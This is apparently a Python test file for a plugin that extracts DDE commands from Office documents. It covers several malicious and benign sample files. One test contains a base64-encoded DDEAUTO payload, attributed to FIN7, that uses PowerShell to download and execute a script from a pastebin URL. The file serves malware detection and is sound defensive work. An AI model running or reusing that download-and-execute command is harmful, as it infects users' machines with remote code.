"""
Office DDE test suite
=====================

"""

import base64

from azul_runner import FV, Event, JobResult, State, test_template

from azul_plugin_office.plugin_dde import AzulPluginOfficeDDE


class TestExecute(test_template.TestPlugin):
    PLUGIN_TO_TEST = AzulPluginOfficeDDE

    def test_malicious_docx(self):
        """Malicious docx with embedded DDEAUTO."""
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb",
                        "Malicious Microsoft Open XML document, thread actor FIN7.",
                    ),
                )
            ]
        )
        # Base64 encoded version of the command to avoid Windows AV scanner.
        base64_command = "RERFQVVUTyBjOlxcd2luZG93c1xcc3lzdGVtMzJcXGNtZC5leGUgIi9rIHBvd2Vyc2hlbGwgLUMgO2VjaG8gXCJodHRwczovL3NlYy5nb3YvXCI7SUVYKChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvcHhTRTJUSjEnKSkgIg=="
        decoded_string_val = base64.b64decode(base64_command).decode()
        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        entity_type="binary",
                        entity_id="bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb",
                        features={
                            "dde_command": [FV(decoded_string_val)],
                            "dde_url": [FV("https://pastebin.com/raw/pxSE2TJ1"), FV("https://sec.gov/")],
                        },
                    )
                ],
            ),
        )

    def test_no_dde_doc(self):
        """Test document with no DDE links"""
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "ffc7df1b29a93d861ad70ed3d5bccdfa4312140185520cc6a58cce5b9e11215a",
                        "Malicious Microsoft Excel document, auto open macro.",
                    ),
                )
            ]
        )
        self.assertJobResult(result, JobResult(state=State(State.Label.COMPLETED_EMPTY)))

    def test_no_dde_found_with_unicode_return(self):
        """Test document with no DDE links.

        msodde.process_file returns the string '\x01１－職員情報.xls' for this case.
        """
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "9b4b94e1b3e066cf35f307d60cf3fa8755e61edf032f88e7f045d2020e39fd08",
                        "Benign Microsoft Excel Spreadsheet with DDE and unicode.",
                    ),
                )
            ]
        )
        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        entity_type="binary",
                        entity_id="9b4b94e1b3e066cf35f307d60cf3fa8755e61edf032f88e7f045d2020e39fd08",
                        features={"dde_command": [FV("\x01１－職員情報.xls")]},
                    )
                ],
            ),
        )

    def test_no_dde_found(self):
        """Test document with no DDE links

        msodde.process_file returns the string '\x01SERVICES.XLS'
        """
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "ad29e6aff21c54ce766d645723fa625110f56984bc92bd74f1aa077c0b5bf1ed",
                        "Benign Microsoft Excel spreadsheet with DDE.",
                    ),
                )
            ]
        )
        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        entity_type="binary",
                        entity_id="ad29e6aff21c54ce766d645723fa625110f56984bc92bd74f1aa077c0b5bf1ed",
                        features={"dde_command": [FV("\x01SERVICES.XLS")]},
                    )
                ],
            ),
        )
